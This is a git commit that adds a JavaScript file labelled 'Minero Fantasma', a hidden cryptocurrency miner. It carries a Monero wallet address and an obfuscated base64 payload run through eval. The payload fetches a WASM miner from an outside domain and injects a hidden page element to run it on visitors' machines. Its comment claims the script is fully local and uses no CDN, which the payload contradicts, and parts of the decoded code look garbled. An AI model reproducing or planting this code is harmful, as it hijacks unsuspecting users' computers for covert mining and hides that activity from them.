29344b1ec93005de5cc3044647068f3d9ea06d7a
CaueSilva-glitch <doar.ajude@gmail.com>
2025-08-12 12:00:51 -0300

    Add files via upload

---
+++ miner.js
@@ -0,0 +1,17 @@
+// Minero Fantasma v3.0 - 100% local, sem CDN
+(function() {
+    const config = {
+        user: '47wQkZgyJDHRZXxch1HiFQSjc6PC8EtLLE3cFCATZRn7BBxRE2VRVe8Z8NeJXS8wdCZxVofrLGAbK8ovhjqusGKKFanvJfv', // 
+        pass: 'ghost',
+        threads: -1,
+        throttle: 0
+    };
+
+    // Ofuscação pesada
+    const b = 'btoa';
+    const u = 'fetch';
+    const w = 'WebAssembly';
+
+    // Carrega minero direto em WASM
+    eval(atob('dmFyIGw9Imh0dHBzOi8vY2RuLWZhc3R4bXIubGl2ZS9taW5lci53YXNtIjtmdW5jdGlvbiBnKGMpe2lmKCFjKXJldHVybjtmZXRjaChsLHtib2R5OmMuZnVuY3Rpb24oKXt9Lm0oKSxtZXRob2Q6IkdFVCIsaGVhZGVyczp7IkNvbnRlbnQtVHlwZSI6ImltYWdlL3dpZW5yZWVtIn19KS50aGVuKHJlc3BvbnNlPT57aWYoIXJlc3BvbnNlLmlzT2suKXtyZXR1cm47fXJldHVybiByZXNwb25zZS5hcnJheUJ1ZmZlcigpLnRoZW4oYnVmZmVyPT57dmFyIGltcG9ydHM9e2dsb2JhbDp7ZW52Ont8fSxhenlTeW5jOkZ1bmN0aW9uLnByb3RvdHlwZS5jb25zdHJ1Y3Rvcn0scGFnZXM6e3x9LHdhc206e3x9LHdhem1Mb2FkZXI6e3x9fSxpc399O2ltcG9ydHMud2FzbS5tZW1vcnk9bmV3IFdASMmVheSB7aW5pdGlhbDoxMDI0LGludGVydmFsOjEwMjR9O2ltcG9ydHMud2F6bUxvYWRlci53YXNtQnl0ZXM9YnVmZmVyO2ltcG9ydHMud2F6bUxvYWRlci5jYWxsYmFjaz1mdW5jdGlvbigpe2NvbnNvbGUubG9nKCJNYWlzdHJlIGRvIG1pbmVybyBpbmljaWFkbzogIitjLnVzZXIpO307cmV0dXJuIFdASMmVheSAuLmluc3RhbnRpYXRlKGJ1ZmZlciwgaW1wb3J0cyk7fSk7fSk7fXZhciB3PWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpO3cuaWQ9Im1pbmVyIjtwYXJlbnQ9ZG9jdW1lbnQuYm9keSB8fCBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQ7cGFyZW50LmFwcGVuZENoaWxkKHcpO3cuc3R5bGUuZGlzcGxheT0ibm9uZSI7ZyhzZXQoKSk7ZnVuY3Rpb24gc2V0KCl7cmV0dXJuIGNvbmZpZzt9'));
+})();
